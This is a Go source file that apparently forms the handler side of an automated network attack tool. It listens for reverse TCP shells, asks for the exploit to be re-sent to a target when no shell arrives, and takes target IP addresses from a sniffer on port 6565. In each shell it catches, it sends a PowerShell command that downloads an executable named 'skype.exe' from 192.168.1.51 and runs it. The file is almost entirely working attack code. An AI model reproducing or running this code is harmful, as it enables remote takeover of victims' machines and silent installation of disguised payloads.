package main

import (
  "fmt"
  "net"
  "bufio"
  "time"
)

func ListenForConnection(listener net.Listener, connchan chan net.Conn) {
  conn, err := listener.Accept()
  if err != nil {
    fmt.Println("we gotta connection accept error boss, " + err.Error())
  }
  fmt.Println("TCP connection accepted")
  connchan <- conn
}

func CloseConnectionLoudly(conn net.Conn) {
  conn.Close()
  fmt.Println("Connection closed")
}

func ListenAndHandleTCPShell(listener net.Listener, ip string, exploit_request_channel chan string){
  command := "C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -C \"(new-object Net.WebClient).DownloadFile('http://192.168.1.51/skype.exe', 'C:\\skype.exe')\" && C:\\skype.exe"
  fmt.Println("Listening for reverse TCP shell...")
  i := 0
  connchan := make(chan net.Conn)
  var conn net.Conn
  go ListenForConnection(listener, connchan)
  for{
    select{
    case conn = <- connchan:
      i = -1
    case <- time.After(6000 * time.Millisecond)://timeout
      fmt.Println("No connection found, attempting to exploit again")
      exploit_request_channel <- ip
    }
    if i == -1 {
      break
    }
    i++
    if i == 6 {
      fmt.Println("Failed to exploit target after 6 tries: " + ip)
      return
    }
  }
  reader := bufio.NewReader(conn)
  writer := bufio.NewWriter(conn)

  _, readerr := reader.ReadString('>')
  if readerr != nil {
    fmt.Println("Error reading from reverse shell: " + readerr.Error())
  }
  fmt.Println("Shell acquired, launching command: " + command)
  _, writeerr := writer.WriteString(command)
  if writeerr != nil {
    fmt.Println("Error writing to reverse shell: " + writeerr.Error())
  }
  writer.WriteString("\r\n")
  writer.Flush()

  _, readerr = reader.ReadString('>')
  if readerr != nil {
    fmt.Println("Error reading from reverse shell: " + readerr.Error())
  }
  fmt.Println("Command successfully launched")

  CloseConnectionLoudly(conn)
}

func ListenForSnifferData(ip_passing_channel chan string){
  listener, _ := net.Listen("tcp", ":6565")
  for {
    conn, err := listener.Accept()
    if err != nil {
      fmt.Println("We gotta error connecting to the sniffer: " + err.Error())
    }
    ipreader := bufio.NewReader(conn)
    ip, readerr := ipreader.ReadString('\x00')
    ip = ip[:len(ip) - 1]
    //ip, readerr := ipreader.ReadString('\n')
    if readerr != nil {
      fmt.Println("We gotta error reading from the sniffer: " + readerr.Error())
    }
    fmt.Println("Read IP: " + ip)
    fmt.Println("Listener is passing IPs")
    ip_passing_channel <- ip
  }
}
